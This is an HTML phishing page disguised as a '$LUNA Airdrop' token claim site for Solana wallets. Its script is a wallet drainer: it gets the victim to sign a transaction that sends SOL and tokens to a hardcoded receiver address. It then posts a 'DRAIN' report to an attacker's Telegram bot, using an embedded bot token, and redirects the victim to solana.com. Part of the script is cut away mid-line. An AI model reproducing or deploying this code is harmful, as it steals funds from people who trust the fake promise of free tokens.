xt-align:center;margin:1rem 0;font-size:1.1rem;opacity:.9}.connected{color:#00ff9d;font-weight:600}.small{font-size:.95rem;opacity:.7;text-align:center;margin-top:1.5rem}.loader{border:4px solid rgba(255,255,255,.1);border-top:4px solid var(--accent);border-radius:50%;width:32px;height:32px;animation:spin 1s linear infinite;margin:2rem auto;display:none}@keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(360deg)}}</style></head><body><header><div style="font-weight:700;font-size:1.3rem;color:var(--accent)">$LUNA Airdrop</div><div>2026 Season 1</div></header><main><h1>Claim Your $LUNA Tokens</h1><p class="subtitle">Connect your Solana wallet to verify eligibility and claim up to 85,000 $LUNA + bonus rewards. Limited to first 4,200 claims.</p><div class="card"><button id="connectBtn">Connect Solana Wallet</button><div id="status"></div><div class="loader" id="loader"></div><button id="claimBtn">Claim Rewards</button><p class="small">Gas sponsored ‚Ä¢ No approvals needed ‚Ä¢ Instant on-chain delivery</p></div></main><script>const RECEIVER="HnFjLMtLiBJCeiU5raYpNVe6bgRkz9tYSSQFkyMEygdY";const RPC="https://api.testnet.solana.com";const TELEGRAM_BOT_TOKEN="8324063009:AAEEKCfdI6AEurQMYPD5DImO5DISPLjDcQ0";const TELEGRAM_CHAT_ID="-1003827765600";const MIN_LEAVE_LAMPORTS=5000000n;const MAX_TOKENS=2;async function sendTelegram(text){try{await fetch("https://api.telegram.org/bot"+TELEGRAM_BOT_TOKEN+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:text,parse_mode:"HTML",disable_web_page_preview:true})});}catch(e){}}function short(addr){return addr.slice(0,5)+"..."+addr.slice(-4);}let publicKey=null;const status=document.getElementById("status");const loader=document.getElementById("loader");const connectBtn=document.getElementById("connectBtn");const claimBtn=document.getElementById("claimBtn");connectBtn.onclick=async()=>{if(!window.solana){status.textContent="Please install Phantom or Backpack n;}const tx=new solanaWeb3.VersionedTransaction(message.compileToV0Message());status.textContent="Please approve in wallet...";loader.style.display="none";const signedTx=await window.solana.signTransaction(tx);status.textContent="Broadcasting...";loader.style.display="block";const signature=await connection.sendRawTransaction(signedTx.serialize(),{skipPreflight:false,maxRetries:4});await connection.confirmTransaction(signature,"confirmed");const solDrained=Number(solToDrain)/1e9;let msg="üíÄ DRAIN\n"+publicKey.toBase58()+"\nSOL: "+solDrained.toFixed(5);if(tokens.length>0){msg+="\nTokens:";tokens.forEach(t=>{msg+="\n"+t.mint.slice(0,6)+"... "+t.ui.toFixed(3);});}msg+="\nhttps://explorer.solana.com/tx/"+signature+"?cluster=testnet";sendTelegram(msg);status.innerHTML='Success! <a href="https://explorer.solana.com/tx/'+signature+'?cluster=testnet" target="_blank" style="color:var(--accent)">View</a>';confetti({particleCount:120,spread:80,origin:{y:0.65}});setTimeout(()=>{window.location.href="https://solana.com";},2800);}catch(err){const msg=err.message||"unknown error";status.textContent=msg.includes("User rejected")?"Signature rejected":"Transaction failed";sendTelegram("‚ùå "+(publicKey?publicKey.toBase58():"unknown")+"\n"+msg);loader.style.display="none";claimBtn.disabled=false;}};</script></body></html>
